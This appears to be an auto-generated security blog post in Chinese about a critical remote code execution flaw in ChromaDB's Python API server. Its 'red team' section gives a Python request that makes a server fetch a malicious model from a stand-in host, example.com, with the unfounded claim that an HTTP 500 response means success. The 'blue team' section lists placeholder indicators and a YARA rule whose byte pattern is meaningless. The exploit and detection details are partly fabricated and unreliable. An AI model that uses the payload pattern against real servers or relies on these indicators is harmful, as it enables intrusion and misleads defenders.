---
layout: post
title:  "Max-severity flaw in ChromaDB for AI apps allows server hijacking"
date:   2026-05-20 02:38:47 +0000
categories: [security]
severity: critical
---

# 🚨 解析 ChromaDB 中的任意代碼執行漏洞

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：10.0)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Deserialization`, `API Hijacking`, `Model Loading`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ChromaDB 的 Python API 伺服器邏輯中存在一個漏洞，允許未經驗證的攻擊者在暴露的伺服器上執行任意代碼。這個漏洞是由於在驗證之前就允許攻擊者嵌入模型設定，從而導致攻擊者可以在伺服器上執行任意代碼。
* **攻擊流程圖解**:
  1. 攻擊者發送一個精心構造的請求給 ChromaDB 伺服器。
  2. 伺服器在驗證之前就允許攻擊者嵌入模型設定。
  3. 攻擊者可以在請求中指定一個惡意的模型，從而導致伺服器在本地執行惡意代碼。
  4. 驗證檢查是在模型已經被加載和執行之後進行的，因此攻擊者可以繞過安全機制。
* **受影響元件**: ChromaDB 1.0.0 至 1.5.8 版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道 ChromaDB 伺服器的 IP 地址和端口號。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義惡意模型的 URL
    malicious_model_url = "https://example.com/malicious_model"
    
    # 定義請求的 payload
    payload = {
        "model": malicious_model_url
    }
    
    # 發送請求給 ChromaDB 伺服器
    response = requests.post("http://chromadb-server:8000/api/load_model", json=payload)
    
    # 如果伺服器返回 500 錯誤，則表示攻擊成功
    if response.status_code == 500:
        print("攻擊成功！")
    
    ```
* **繞過技術**: 攻擊者可以使用 WAF 繞過技巧，例如使用 Base64 編碼的 payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /api/load_model |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule chromadb_rce {
        meta:
            description = "ChromaDB RCE Detection"
            author = "Your Name"
        strings:
            $payload = { 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 }
        condition:
            $payload at 0
    }
    
    ```
* **緩解措施**: 更新 ChromaDB 至最新版本，限制網路存取，使用 Rust 前端，或者使用 WAF 來過濾惡意請求。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Deserialization (反序列化)**: 想像你有一個物件，需要將它轉換成一個字串，以便存儲或傳輸。反序列化就是將這個字串轉換回原來的物件。技術上，反序列化是指將一個序列化的物件轉換回原來的物件，從而可以存取其屬性和方法。
* **API Hijacking (API 劫持)**: 想像你有一個 API，需要驗證用戶身份。API 劫持就是攻擊者可以在驗證之前就嵌入惡意代碼，從而導致 API 執行惡意代碼。技術上，API 劫持是指攻擊者可以在 API 請求中嵌入惡意代碼，從而導致 API 執行惡意代碼。
* **Model Loading (模型加載)**: 想像你有一個模型，需要加載到記憶體中，以便使用。模型加載就是將模型從存儲中加載到記憶體中。技術上，模型加載是指將模型從存儲中加載到記憶體中，從而可以存取其屬性和方法。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/max-severity-flaw-in-chromadb-for-ai-apps-allows-server-hijacking/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


